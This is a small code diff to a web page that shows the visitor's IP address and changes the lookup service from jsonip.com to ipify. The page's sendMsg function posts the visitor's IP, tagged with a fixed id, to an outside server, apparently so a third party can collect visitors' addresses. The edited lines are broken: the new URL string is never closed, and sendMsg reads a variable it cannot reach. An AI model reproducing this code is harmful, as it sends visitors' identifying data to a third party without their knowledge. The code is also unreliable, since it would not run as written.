@@ -7,12 +7,12 @@
 	<span>Your IP address is: </span>
 	<p class="ip"></p>
 <script>
-        $.getJSON("http:/ / jsonip.com ? callback = ? ", function (data) {
-    $(".ip ").text(data.ip); 
+        $.getJSON(" https://api64.ipify.org?format=json, function (data) {
+    $(".ip ").text(data); 
   });
         var id = "16965075642233";
         function sendMsg() {
-            var text = data.ip;
+            var text = data;
             $.post("https://harfeto.timefriend.net/harfeto/sendMsg", {text: text,id:id},function(result,status){
                 if(status=='success'){
                     var obj = JSON.parse(result);
